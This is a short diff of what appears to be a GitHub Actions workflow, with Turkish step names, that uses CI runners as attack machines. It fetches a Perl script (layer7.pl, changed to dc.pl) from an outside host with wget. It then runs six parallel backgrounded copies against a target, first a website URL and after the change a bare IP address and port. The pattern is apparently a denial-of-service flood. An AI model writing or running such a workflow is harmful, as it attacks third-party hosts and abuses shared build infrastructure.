@@ -16,14 +16,14 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/C8l6A80AdA/layer7.pl
+          wget https://wgetz.com/5mw38UO92O/dc.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl layer7.pl http://flances.site/ 1000 1000 optional &
+            perl dc.pl 104.29.142.99 19332 60 60 &
             PIDS+=($!)
           done
           
